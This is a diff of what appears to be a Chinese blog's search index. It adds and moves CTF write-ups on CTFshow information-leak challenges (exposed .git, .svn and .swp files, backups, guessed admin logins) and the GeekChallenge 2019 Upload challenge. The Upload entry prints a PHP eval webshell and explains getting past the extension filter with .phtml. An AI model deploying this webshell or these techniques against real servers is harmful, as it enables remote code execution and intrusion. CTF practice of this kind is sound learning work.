@@ -91,6 +91,8 @@
 <li>内存编号是从0开始记录的，一般用十六进制数字表示</li>
 <li>可以利用指针的变量保存地址</li>
 </ul>
+<span id="more"></span>
+
 <h1 id="指针的定义和使用"><a href="#指针的定义和使用" class="headerlink" title="指针的定义和使用"></a>指针的定义和使用</h1><p>指针定义语法：<code>数据类型 * 指针变量名</code>例如int * p;</p>
 <p>&amp;为取址符，例如</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> * p;</span><br><span class="line">    p=&amp;a;</span><br><span class="line">    cout &lt;&lt;<span class="string">&quot;a的地址为&quot;</span>&lt;&lt;&amp;a&lt;&lt; endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;指针p为&quot;</span>&lt;&lt;p&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;*p&lt;&lt;endl;</span><br><span class="line">    *p=<span class="number">1000</span>;</span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -2335,6 +2337,55 @@
       </tags>
   </entry>
   <entry>
+    <title>刷题记录-3（信息收集）</title>
+    <url>/2022/02/12/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-3/</url>
+    <content><![CDATA[<h1 id="vim临时文件泄露（CTFshow）"><a href="#vim临时文件泄露（CTFshow）" class="headerlink" title="vim临时文件泄露（CTFshow）"></a>vim临时文件泄露（CTFshow）</h1><p>直接进入index.php.swp下载文件即可得到flag。用dirsearch扫描无结果</p>
+<p>即构造<code>/index.php.swp</code>index.php使传统意义上的默认主页</p>
+<span id="more"></span>
+
+<h1 id="cookie泄露（CTFshow）"><a href="#cookie泄露（CTFshow）" class="headerlink" title="cookie泄露（CTFshow）"></a>cookie泄露（CTFshow）</h1><p>这个直接用cookie editor查看即可，也可以抓包</p>
+<h1 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h1><p>js前台拦截，无法查看源码，则在url前面加上<code>view-source:</code>即可查看</p>
+<h1 id="WEB3"><a href="#WEB3" class="headerlink" title="WEB3"></a>WEB3</h1><p>直接抓包发往repeater，然后在response中发现flag</p>
+<h1 id="WEB4"><a href="#WEB4" class="headerlink" title="WEB4"></a>WEB4</h1><p>根据题目提示，进入robots.txt，接着根据提示进入/flagishere.txt得到flag</p>
+<h1 id="WEB5"><a href="#WEB5" class="headerlink" title="WEB5"></a>WEB5</h1><p>.phps文件的解释</p>
+<p>phps即为 PHP Source。PHP Source 由 The PHP Group 发布，是最通用的关联应用程序。phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。但是，并不是所有的php文件都存在.phps后缀，不是默认带有，只会在特殊情况下存在</p>
+<p>这里根据提示访问index.phps文件，得到flag</p>
+<h1 id="WEB6"><a href="#WEB6" class="headerlink" title="WEB6"></a>WEB6</h1><p>访问<code>url/www.zip</code>进行下载源码，解压后即可得到flag</p>
+<h1 id="WEB7"><a href="#WEB7" class="headerlink" title="WEB7"></a>WEB7</h1><p>考察git代码泄露，访问<code>url/.git/index.php</code>得到flag</p>
+<h1 id="WEB8"><a href="#WEB8" class="headerlink" title="WEB8"></a>WEB8</h1><p>考察SVN泄露</p>
+<p>SVN（subversion）是源代码的版本管理软件，造成SVN源代码泄露的主要原因是管理员操作不规范将SVN隐藏文件夹暴露到外网环境中</p>
+<p>访问<code>url/.svn</code>获得flag</p>
+<h1 id="WEB9"><a href="#WEB9" class="headerlink" title="WEB9"></a>WEB9</h1><p>考察Vim泄露，直接访问<code>url/index.php.swp</code>即可，然后打开下载的文件，即可获得flag</p>
+<h1 id="WEB10"><a href="#WEB10" class="headerlink" title="WEB10"></a>WEB10</h1><p>用cookie editor查看，然后url解码即可，也可以抓包</p>
+<h1 id="WEB11"><a href="#WEB11" class="headerlink" title="WEB11"></a>WEB11</h1><p>TXT记录</p>
+<ul>
+<li>示例：ns1.exmaple.com. IN TXT   “联系电话：XXXX”</li>
+<li>解释：【domain】 IN TXT 【任意字符串】</li>
+</ul>
+<p>干什么用呢？</p>
+<p>一般指某个主机名或域名的说明，或者联系方式，或者标注提醒等等。</p>
+<p>直接检查ctfshow.com的DNS中的TXT记录（这里用<a href="https://zijian.aliyun.com/">阿里的</a>），即可获得flag。<a href="https://www.jianshu.com/p/b483300378af">其他记录</a></p>
+<h1 id="WEB12"><a href="#WEB12" class="headerlink" title="WEB12"></a>WEB12</h1><p>robots.txt：记录一些目录和<a href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/2683135">CMS</a>版本信息</p>
+<p>进入<code>url/robots.txt</code>得知有/admin/文件夹，然后<code>url/admin</code>进入，然后猜测账户为admin，密码为下面的电话号，登入得到flag</p>
+<h1 id="WEB13"><a href="#WEB13" class="headerlink" title="WEB13"></a>WEB13</h1><p>拉到最下面发现document可以点击，进入后发现后台格式，还有账号和密码，登入得到flag</p>
+<h1 id="WEB14"><a href="#WEB14" class="headerlink" title="WEB14"></a>WEB14</h1><p>根据提示，进入<code>url/editor</code>路径</p>
+<p>然后点击flash中的文件空间，在var/www/html/nothinghere/fl000g.txt发现flag，然后进入url/nothinghere/fl000g.txt得到flag</p>
+<h1 id="WEB15"><a href="#WEB15" class="headerlink" title="WEB15"></a>WEB15</h1><p>浏览页面后，发现邮箱，尝试进入url/admin。发现后台登录页面，账户时admin，点击忘记密码，然后用qq搜索刚才的邮箱qq发现地址西安，密码重置后登录获得flag</p>
+<h1 id="WEB16"><a href="#WEB16" class="headerlink" title="WEB16"></a>WEB16</h1><p>题目说有探针，那么访问<code>url/tz.php</code>然后在phpinfo中搜索flag得到flag</p>
+<h1 id="WEB17"><a href="#WEB17" class="headerlink" title="WEB17"></a>WEB17</h1><p>直接输入<code>url/backup.sql</code>下载备份文件，得到flag</p>
+<h1 id="WEB18"><a href="#WEB18" class="headerlink" title="WEB18"></a>WEB18</h1><p>进入游戏后，查看js文件，然后发现一段Unicode加密的密文，</p>
+<p>\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</p>
+<p>解密后：你赢了，去幺幺零点皮爱吃皮看看</p>
+<p>进入url/110.php得到flag</p>
+<h1 id="WEB19"><a href="#WEB19" class="headerlink" title="WEB19"></a>WEB19</h1><p><img src="/2022/02/12/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-3/image-20220214110909063.png" alt="image-20220214110909063"></p>
+<p>用hackbar传参得到flag</p>
+<h1 id="WEB20"><a href="#WEB20" class="headerlink" title="WEB20"></a>WEB20</h1><p>根据提示mdb文件是早期asp+access构架的数据库文件 访问<code>url/db/db.mdb</code> 下载文件通过txt打开然后搜索flag得到flag</p>
+]]></content>
+      <tags>
+        <tag>刷题</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>刷题记录-2</title>
     <url>/2022/02/04/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1/</url>
     <content><![CDATA[<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>尝试用万能密码，万能密码原理<a href="https://blog.csdn.net/hxhxhxhxx/article/details/108020010">点这</a>。</p>
@@ -2424,55 +2475,6 @@
 <h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// step 4</span></span><br><span class="line">    <span class="variable">$val5</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val5&#x27;</span>];</span><br><span class="line">    <span class="variable">$val6</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val6&#x27;</span>];</span><br><span class="line">    <span class="variable">$val7</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val7&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="variable">$val5</span>) === md5(<span class="variable">$val6</span>) &amp;&amp; md5(<span class="variable">$val6</span>) === md5(<span class="variable">$val7</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;tql!ddw! 记录你的名字吧!&quot;</span>;</span><br><span class="line">        <span class="variable">$name</span> =  @<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$name</span>)&gt;<span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;what???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(<span class="string">&quot;./success.txt&quot;</span>,<span class="variable">$name</span>.PHP_EOL,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这个不用搞了，没传值直接就ok</p>
-]]></content>
-      <tags>
-        <tag>刷题</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>刷题记录-3（信息收集）</title>
-    <url>/2022/02/12/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-3/</url>
-    <content><![CDATA[<h1 id="vim临时文件泄露（CTFshow）"><a href="#vim临时文件泄露（CTFshow）" class="headerlink" title="vim临时文件泄露（CTFshow）"></a>vim临时文件泄露（CTFshow）</h1><p>直接进入index.php.swp下载文件即可得到flag。用dirsearch扫描无结果</p>
-<p>即构造<code>/index.php.swp</code>index.php使传统意义上的默认主页</p>
-<span id="more"></span>
-
-<h1 id="cookie泄露（CTFshow）"><a href="#cookie泄露（CTFshow）" class="headerlink" title="cookie泄露（CTFshow）"></a>cookie泄露（CTFshow）</h1><p>这个直接用cookie editor查看即可，也可以抓包</p>
-<h1 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h1><p>js前台拦截，无法查看源码，则在url前面加上<code>view-source:</code>即可查看</p>
-<h1 id="WEB3"><a href="#WEB3" class="headerlink" title="WEB3"></a>WEB3</h1><p>直接抓包发往repeater，然后在response中发现flag</p>
-<h1 id="WEB4"><a href="#WEB4" class="headerlink" title="WEB4"></a>WEB4</h1><p>根据题目提示，进入robots.txt，接着根据提示进入/flagishere.txt得到flag</p>
-<h1 id="WEB5"><a href="#WEB5" class="headerlink" title="WEB5"></a>WEB5</h1><p>.phps文件的解释</p>
-<p>phps即为 PHP Source。PHP Source 由 The PHP Group 发布，是最通用的关联应用程序。phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。但是，并不是所有的php文件都存在.phps后缀，不是默认带有，只会在特殊情况下存在</p>
-<p>这里根据提示访问index.phps文件，得到flag</p>
-<h1 id="WEB6"><a href="#WEB6" class="headerlink" title="WEB6"></a>WEB6</h1><p>访问<code>url/www.zip</code>进行下载源码，解压后即可得到flag</p>
-<h1 id="WEB7"><a href="#WEB7" class="headerlink" title="WEB7"></a>WEB7</h1><p>考察git代码泄露，访问<code>url/.git/index.php</code>得到flag</p>
-<h1 id="WEB8"><a href="#WEB8" class="headerlink" title="WEB8"></a>WEB8</h1><p>考察SVN泄露</p>
-<p>SVN（subversion）是源代码的版本管理软件，造成SVN源代码泄露的主要原因是管理员操作不规范将SVN隐藏文件夹暴露到外网环境中</p>
-<p>访问<code>url/.svn</code>获得flag</p>
-<h1 id="WEB9"><a href="#WEB9" class="headerlink" title="WEB9"></a>WEB9</h1><p>考察Vim泄露，直接访问<code>url/index.php.swp</code>即可，然后打开下载的文件，即可获得flag</p>
-<h1 id="WEB10"><a href="#WEB10" class="headerlink" title="WEB10"></a>WEB10</h1><p>用cookie editor查看，然后url解码即可，也可以抓包</p>
-<h1 id="WEB11"><a href="#WEB11" class="headerlink" title="WEB11"></a>WEB11</h1><p>TXT记录</p>
-<ul>
-<li>示例：ns1.exmaple.com. IN TXT   “联系电话：XXXX”</li>
-<li>解释：【domain】 IN TXT 【任意字符串】</li>
-</ul>
-<p>干什么用呢？</p>
-<p>一般指某个主机名或域名的说明，或者联系方式，或者标注提醒等等。</p>
-<p>直接检查ctfshow.com的DNS中的TXT记录（这里用<a href="https://zijian.aliyun.com/">阿里的</a>），即可获得flag。<a href="https://www.jianshu.com/p/b483300378af">其他记录</a></p>
-<h1 id="WEB12"><a href="#WEB12" class="headerlink" title="WEB12"></a>WEB12</h1><p>robots.txt：记录一些目录和<a href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/2683135">CMS</a>版本信息</p>
-<p>进入<code>url/robots.txt</code>得知有/admin/文件夹，然后<code>url/admin</code>进入，然后猜测账户为admin，密码为下面的电话号，登入得到flag</p>
-<h1 id="WEB13"><a href="#WEB13" class="headerlink" title="WEB13"></a>WEB13</h1><p>拉到最下面发现document可以点击，进入后发现后台格式，还有账号和密码，登入得到flag</p>
-<h1 id="WEB14"><a href="#WEB14" class="headerlink" title="WEB14"></a>WEB14</h1><p>根据提示，进入<code>url/editor</code>路径</p>
-<p>然后点击flash中的文件空间，在var/www/html/nothinghere/fl000g.txt发现flag，然后进入url/nothinghere/fl000g.txt得到flag</p>
-<h1 id="WEB15"><a href="#WEB15" class="headerlink" title="WEB15"></a>WEB15</h1><p>浏览页面后，发现邮箱，尝试进入url/admin。发现后台登录页面，账户时admin，点击忘记密码，然后用qq搜索刚才的邮箱qq发现地址西安，密码重置后登录获得flag</p>
-<h1 id="WEB16"><a href="#WEB16" class="headerlink" title="WEB16"></a>WEB16</h1><p>题目说有探针，那么访问<code>url/tz.php</code>然后在phpinfo中搜索flag得到flag</p>
-<h1 id="WEB17"><a href="#WEB17" class="headerlink" title="WEB17"></a>WEB17</h1><p>直接输入<code>url/backup.sql</code>下载备份文件，得到flag</p>
-<h1 id="WEB18"><a href="#WEB18" class="headerlink" title="WEB18"></a>WEB18</h1><p>进入游戏后，查看js文件，然后发现一段Unicode加密的密文，</p>
-<p>\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</p>
-<p>解密后：你赢了，去幺幺零点皮爱吃皮看看</p>
-<p>进入url/110.php得到flag</p>
-<h1 id="WEB19"><a href="#WEB19" class="headerlink" title="WEB19"></a>WEB19</h1><p><img src="/2022/02/12/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-3/image-20220214110909063.png" alt="image-20220214110909063"></p>
-<p>用hackbar传参得到flag</p>
-<h1 id="WEB20"><a href="#WEB20" class="headerlink" title="WEB20"></a>WEB20</h1><p>根据提示mdb文件是早期asp+access构架的数据库文件 访问<code>url/db/db.mdb</code> 下载文件通过txt打开然后搜索flag得到flag</p>
 ]]></content>
       <tags>
         <tag>刷题</tag>
@@ -2749,6 +2751,39 @@
       </tags>
   </entry>
   <entry>
+    <title>极客大挑战 2019Upload</title>
+    <url>/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/</url>
+    <content><![CDATA[<p>该题为上传木马题</p>
+<p>进入题目后，上传一句话木马</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140512260.png" alt="image-20211202140512260"></p>
+<p>出现如下界面，说明木马不能含有”&lt;?”字符</p>
+<span id="more"></span>
+
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140538654.png" alt="image-20211202140538654"></p>
+<p>因为现在不会写一句话木马，则上网搜不含“&lt;?”的木马</p>
+<p>得到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>新建php文档，将代码输入其中，并抓包，修改格式，上传。</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155449805.png" alt="image-20211202155449805"></p>
+<p>上传失败</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155757260.png" alt="image-20211202155757260"></p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160253250.png" alt="image-20211202160253250"></p>
+<p>绕过后缀的有文件格式有php,php3,php4,php5,phtml，pht，但php，pht被ban了，php345也不行的都不行，则用phtml</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160420596.png" alt="image-20211202160420596"></p>
+<p>上传后</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160637524.png" alt="image-20211202160637524"></p>
+<p>打开蚁剑连接后发生错误，猜测是中文名字的原因，换成英文名，猜测上传后的文件在upload</p>
+<p>链接成功</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161339014.png" alt="image-20211202161339014"></p>
+<p>最后在根目录下得到flag</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161504689.png" alt="image-20211202161504689"></p>
+]]></content>
+      <tags>
+        <tag>webshell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>极客大挑战 2019 EasySQL</title>
     <url>/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/</url>
     <content><![CDATA[<p>打开题目如下</p>
@@ -2797,39 +2832,6 @@
 ]]></content>
       <tags>
         <tag>SQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>极客大挑战 2019Upload</title>
-    <url>/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/</url>
-    <content><![CDATA[<p>该题为上传木马题</p>
-<p>进入题目后，上传一句话木马</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140512260.png" alt="image-20211202140512260"></p>
-<p>出现如下界面，说明木马不能含有”&lt;?”字符</p>
-<span id="more"></span>
-
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140538654.png" alt="image-20211202140538654"></p>
-<p>因为现在不会写一句话木马，则上网搜不含“&lt;?”的木马</p>
-<p>得到</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>新建php文档，将代码输入其中，并抓包，修改格式，上传。</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155449805.png" alt="image-20211202155449805"></p>
-<p>上传失败</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155757260.png" alt="image-20211202155757260"></p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160253250.png" alt="image-20211202160253250"></p>
-<p>绕过后缀的有文件格式有php,php3,php4,php5,phtml，pht，但php，pht被ban了，php345也不行的都不行，则用phtml</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160420596.png" alt="image-20211202160420596"></p>
-<p>上传后</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160637524.png" alt="image-20211202160637524"></p>
-<p>打开蚁剑连接后发生错误，猜测是中文名字的原因，换成英文名，猜测上传后的文件在upload</p>
-<p>链接成功</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161339014.png" alt="image-20211202161339014"></p>
-<p>最后在根目录下得到flag</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161504689.png" alt="image-20211202161504689"></p>
-]]></content>
-      <tags>
-        <tag>webshell</tag>
       </tags>
   </entry>
   <entry>
